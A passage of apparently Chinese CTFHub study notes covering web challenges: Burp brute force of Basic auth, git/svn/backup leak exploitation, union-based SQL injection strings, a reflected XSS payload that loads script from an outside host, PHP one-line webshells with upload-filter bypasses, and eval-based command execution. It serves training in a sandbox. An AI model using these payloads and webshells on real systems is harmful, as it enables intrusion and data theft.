Bypass"></a>DNS重绑定 Bypass</h6><p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p><p><del>搜集wp信息</del>：</p><p>我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。<br>即：?url=127.0.0.1.xip.io/flag.php</p><p>但是这个题直接这样也可以</p><p>?url=127.0.0.1/flag.php</p><p>毕竟都是定向到127.0.0.1</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHub学习笔记</title>
      <link href="/2020/12/23/ctfhub-xue-xi-bi-ji/"/>
      <url>/2020/12/23/ctfhub-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1441758494&auto=1&height=66"></iframe><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><pre><code>题目：HTTP Method is GETUse CTF**B Method, I will give you flag.Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</code></pre><p>意思就是你是get请求，你把这个请求换成CTFHUB就行</p><p>所以抓包直接一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>题目：</p><pre><code>No Flag here!Give me Flag</code></pre><p>点击发现没有跳转</p><p>二话不说，抓包一把梭了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p><p>这里状态码变为了302说明进行了重定向</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>直接抓包，本来admin=0，然后给admin赋值=1就行了</p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>得到提示 do u konw admin ?，于是猜测账号是 admin , 那么接下来就只需要爆破密码了。注意看到 HTTP 请求头部的 Authorization 字段，后面的YWFhOmjiYg==用base64 解码后是 aaa:bbb，也就是我们之前输入的账号:密码。</p><p> 使用 BurpSuite 进行基础认证爆破</p><p>（1）将报文发送到 Intruder, 将 Basic后面 base64部分添加为payload position</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（2）在 Payloads选项卡下，选择 Payload Type为SimpleList,然后在 Payload Options 中点击 load 加载密码字典</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（3）Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin:</p><p>  Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（4）Payload Encode 取消勾选的 URL-encode, 不然你会看到base64之后的=会被转成 %3d ，你就算爆破到天荒地老也不会出来</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p><p>（5）Start Attack ，然后按 Length 排序，并看到状态码出现200的，即爆破成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>查看 Response，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p><p>有点操作水平。。。。</p><h4 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a>响应包源码</h4><p>等游戏结束f12查看源码即可</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p><p>ctrl+f一把梭</p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//搜狗截图20年12月23日1437_2.png" style="zoom: 80%;"><p>ctfhub{eff7ead587e67aab8af40775}</p><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>可能有点用的提示：</p><pre><code>#### 常见的网站源码备份文件后缀------- tar- tar.gz- zip- rar#### 常见的网站源码备份文件名------- web- website- backup- back- www- wwwroot- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p><pre><code>\#!usr/bin/env python#_*_ coding:utf-8 _*_import requests url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]for i in list1:  for j in list2:         url_f=url+i+&quot;.&quot;+j    r=requests.get(url_f)        if(r.status_code == 200):            print(url_f)</code></pre><p>对没有错，就是通过这个脚本来判断是哪个页面为200</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p><p>完事！</p><h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>介绍：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>针对index.php.bak文件</p><p>输入下载完以后改为.txt格式打开直接一把梭</p><h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>介绍：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>.index.php.swp</p><p>这里注意index前面有个点</p><p>然后将swp改为txt打开</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>介绍：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>下载完以后用.md文件格式打开</p><p>18c26ec34f6edafc85a7cd5e20853f58.txt发现这个文件</p><p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭</a></p><h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>介绍：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p>先用dirsearch.py进行扫描</p><p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p><pre><code>-u 指定网址 -e 指定网站语言#例如-e php，zip，这里-e*是所有 -t 指定线程 -w 指定字典 -r 递归目录（跑出目录后，继续跑目录下面的目录） --random-agents 使用随机UA(默认在db/uesr-agents.txt中，可以自己添加) -x 排除指定状态码 -s 置请求之间的延时(秒)</code></pre><p>然后用githack脚本跑</p><pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>跑完以后去list目录去看看</p><p>进入所下载的文件里面</p><pre><code>git log#使用git log命令查看本地的所有提交</code></pre><p>得：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p><pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；lscat 241282368416724.txt</code></pre><p>得到flag</p><h4 id="stash（储藏）"><a href="#stash（储藏）" class="headerlink" title="stash（储藏）"></a>stash（储藏）</h4><p>理解：</p><p>当你要修改或者变更文件的时候，可以通过这个git statsh命令将其暂时保存到一个堆栈中，就好像是写到一半的文件突然不写了，你要去写另一个文件，这样为了避免这个文件消失，你就要用这个命令将他进行一下储存，然后办完手头的事情后，你就可以继续通过存到栈里面的文件继续进行之前未完成的编辑，而这个题目，就是针对查找通过stash命令存到栈里面的文件</p><p>和上一题一样</p><pre><code>git log//查看历史记录git stash poplscat 13456789.txt说明：$git stash                 ／／把本地修改并且未提交的内容，存储到本地栈中的栈顶。$do some work        ／／此时你可以去切换分支或者pull最新代码$git stash pop          ／／此时你可以把你刚才stash到本地栈中的代码pop到本地</code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>启动githack</p><pre><code>python GitHack.py http://challenge-3aa10bcada98b68b.sandbox.ctfhub.com:10080/.git</code></pre><p>将他的git文件clone到本地然后查看就直接一把</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51208_1.png" alt></p><h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><p>引子：</p><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><h4 id="去网上了解一下svn漏洞："><a href="#去网上了解一下svn漏洞：" class="headerlink" title="去网上了解一下svn漏洞："></a>去网上了解一下svn漏洞：</h4><h5 id="什么是SVN"><a href="#什么是SVN" class="headerlink" title="什么是SVN?"></a>什么是SVN?</h5><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。<br>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p><p>用到的工具：dvcs-ripper</p><p>用dirsearch跑了一下.svn发现确实有，可能方法不对，跑都跑不完</p><p>然后开始回归正常操作：</p><p>1.下载所需要的工具：</p><pre><code>git clone https://github.com/kost/dvcs-ripper /svn</code></pre><p>我这里是将它下载到svn目录里面</p><p>2.使用</p><pre><code>perl rip-svn.pl -u http://challenge-30d239a5f2b26f23.sandbox.ctfhub.com:10080/.svn/</code></pre><p>补充：需要注意的是，.svn是隐藏文件，在linux下必须ls -al才能看到。<br>3.根据题目的提示，Flag 在服务端旧版本的源代码中。<br>注意那个tree中的pristine，里面一般存储的是代码的历史版本。我们直接进入目录，然后读取文件就可以得到flag了</p><p>问题：该软件不能正常使用，需要配置组件（暂未解决）</p><h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>我的密码是admin123</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51352_2.png" alt></p><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>这个题看很特别，看别人wp上说：是通过网上搜索eyou的默认口令来进入网站</p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/108274723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45785288/article/details/108274723</a></p><p>考查的信息收集能力</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><h4 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h4><p>输入1得到Data: ctfhub输入2得到Data：skill输入3没有回显，输入1 or 1=1也会显示1的内容这是直接显示出来了？</p><h4 id="2-构造注入语句"><a href="#2-构造注入语句" class="headerlink" title="2.构造注入语句"></a>2.构造注入语句</h4><h5 id="a-得到数据库"><a href="#a-得到数据库" class="headerlink" title="a.得到数据库"></a>a.得到数据库</h5><p>-1 union select 1,2</p><p>得到回显Data: 2</p><p>-1 union select 1,3</p><p>得到回显Data: 3</p><p>-1 union select 1,database()</p><p>回显Data: sqli（得到数据库）</p><h5 id="b-得到数据库里面的表"><a href="#b-得到数据库里面的表" class="headerlink" title="b.得到数据库里面的表"></a>b.得到数据库里面的表</h5><p>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p><p>得到回显：</p><p>Data: news,flag</p><h5 id="c-爆列名"><a href="#c-爆列名" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=”flag”</p><p>得到回显：</p><p>Data: flag</p><h5 id="d-爆字段"><a href="#d-爆字段" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>-1 union select 1,group_concat(flag) from flag</p><p>得到回显：</p><p>Data: ctfhub{3040c5c414ba645535376218}</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>就像整数型一样，但是区别于有单引号需要自己构造单引号语句来让其失效</p><h4 id="1-查看数据库的列数"><a href="#1-查看数据库的列数" class="headerlink" title="1.查看数据库的列数"></a>1.查看数据库的列数</h4><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显</p><p>说明有两列</p><h4 id="2-联合查询"><a href="#2-联合查询" class="headerlink" title="2.联合查询"></a>2.联合查询</h4><h5 id="a-爆库名"><a href="#a-爆库名" class="headerlink" title="a.爆库名"></a>a.爆库名</h5><p>这是获取所有数据库的语句：</p><p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p><p>发现information_schema是一个数据库</p><p>‘ union select 1,database()#</p><p>得到了sqli</p><h5 id="b-爆表"><a href="#b-爆表" class="headerlink" title="b.爆表"></a>b.爆表</h5><p>‘ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p><h5 id="c-爆列名-1"><a href="#c-爆列名-1" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’#</p><h5 id="d-爆字段-1"><a href="#d-爆字段-1" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>‘ union select 1,group_concat(flag) from flag – ‘</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>利用xss platform平台创建一个xss反射型的脚本</p><pre><code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xs.sb/wnbP&gt;&lt;/sCrIpT&gt;</code></pre><p>没什么好记的操作很简单直接上大佬的wp</p><p><a href="https://blog.csdn.net/weixin_43486981/article/details/107974878" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43486981/article/details/107974878</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>一句话，一把梭</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_5.png" alt></p><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>与无验证的区别在于对于上传的文件格式的后缀有规定</p><p>所以：shell.php.png 安排只要保证能传上去就行了，同时抓包去掉.png保证蚁剑可以识别</p><p>然后重复一句话，一把梭操作即可</p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>介绍：</p><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p><p>理解：</p><p>看到这，明白了，就好比你即使上传的是png文件，但是通过htaccess文件的解析，你依然是php文件</p><p>大佬的代码：</p><p>//方法一 SetHandler application/x-httpd-php      //所有的文件当做php文件来解析 </p><p>//方法二 AddType application/x-httpd-php .png    //.png文件当作php文件解析</p><p>上传顺序：</p><p>先制作.htaccess再来shell.png（毕竟进行了前端验证）</p><p>1.AddType application/x-httpd-php .png</p><p>2.<?php @eval($_POST['666']);?>一句话，一把梭</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>引子：</p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><p>通过介绍可以看出来，这种类型的过滤不是针对文件后缀名，而是根据http响应头信息，所以一定要通过抓包进行分析：</p><p>如果直接传的话会出现下面结果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p><p>但是如果将：</p><p>Content-Type: application/octet-stream</p><p>改为：</p><p>Content-Type: image/png</p><p>就会显示上传成功</p><p>然后一句话，一把梭</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>引子:</p><p><strong>%00截断的两个条件</strong></p><ul><li>php &lt; 5.3.4</li><li>magic_quotes_gpc = off</li></ul><p>木马的文件格式为：phpwebshell.php%00.jpg</p><p>但是这个题需要截断的地方不是从文件的后缀进行截断，而是在响应后信息进行修改</p><p><strong>分析源码：</strong></p><pre><code>if (!empty($_POST[&#39;submit&#39;])) {    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    $info = pathinfo($name);    $ext = $info[&#39;extension&#39;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, $whitelist)) {        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;/script&gt;&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&quot;;        }    } else {        echo &quot;文件类型不匹配&quot;;    }}</code></pre><p>$_FILES 解释（搬自php手册）<br>$_FILES 数组内容如下:</p><p>$_FILES【‘myFile’][‘name’] 客户端文件的原名称。</p><p>$_FILES【‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</p><p>$_FILES【‘myFile’][‘size’] 已上传文件的大小，单位为字节。</p><p>$_FILES【‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p><p>$_FILES【‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p><p>basename() 函数：返回路径中的文件名部分。<br>$_name 是上传的文件名加后缀<br>$_ext 得到的就是后缀名<br>重点就在 $des这个变量<br>得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名看到这里基本可看出来，如果直接上传的话，文件是会被重新命名的，所以这里就有一个办法就是在</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p><p>这里为自己拟定一个文件名字，并且使用00截断后面自动生成的信息，这样就可以防止你上传的文件被认定为临时文件了</p><p>可以看到之前上传的文件都是被认定为临时文件：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p><p>最后上传的路径为/uoload/1.php然后一句话，一把梭</p><h5 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h5><p>直接不做修改的上传发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p><p>php没了！！！</p><p>所以这里关于绕过，而且明显告诉是双写，那就：</p><p>shell.pphphp</p><p>成功了，一把梭（关于怎么绕过要自己不断尝试，即可）</p><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>都说是文件头检查了，那肯定就是抓包啊</p><p>将文件改为这个</p><p>Content-Type: image/png</p><p>但是说我文件错误，是文件错误，那么就准备改文件，</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>把随便一个图片用hex打开发现他头部信息就是这个GIF89a</p><p>然后继续上传准备一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p><p>success</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>题目：</p><pre><code>&lt;?phpif (isset($_REQUEST[&#39;cmd&#39;])) {    eval($_REQUEST[&quot;cmd&quot;]);} else {    highlight_file(__FILE__);}?&gt;</code></pre><ul><li>eval():该函数可以把字符串作为PHP代码执行</li><li>$_REQUEST[’’]:和GET和POST类似，不过反应速度比较慢</li></ul><p>大体意思是：判断cmd是否被设置，若cmd被赋值，则执行如下语句，否则就继续显示以上代码。<br>方法一：</p><p>eval($_REQUEST[“cmd”]);</p><p>通过蚁剑直接连接，密码cmd</p><p>方法二：</p><p>构造URL：?cmd=system(“ls”);</p><p>发现了index.php</p><p>继续构造?cmd=system(“cd /;ls”);</p><p>得到：bin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p>构造：</p><p>?cmd=system(“cd /;cat flag_30765”);</p><p>success</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code>&lt;?php// 关闭错误报告error_reporting(0);if (isset($_GET[&#39;file&#39;])) {//strpos — 查找字符串首次出现的位置    if 